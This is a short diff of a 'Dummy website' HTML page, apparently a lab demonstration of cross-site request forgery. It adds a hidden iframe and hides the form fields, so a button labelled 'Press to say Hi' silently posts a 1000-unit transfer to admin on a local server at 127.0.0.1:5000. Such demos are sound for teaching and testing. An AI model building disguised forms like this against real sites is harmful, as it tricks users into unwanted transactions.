@@ -6,10 +6,11 @@
     <title>Dummy website</title>
 </head>
 <body>
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
     <form action="http://127.0.0.1:5000/transfer" method="post">
         <h1>Press to say Hi</h1>
-        <input name="to" value="admin">
-        <input name="amount" value="1000">
+        <input type="hidden" name="to" value="admin">
+        <input type="hidden" name="amount" value="1000">
         <button type="submit">submit</button>
     </form>
 </body>
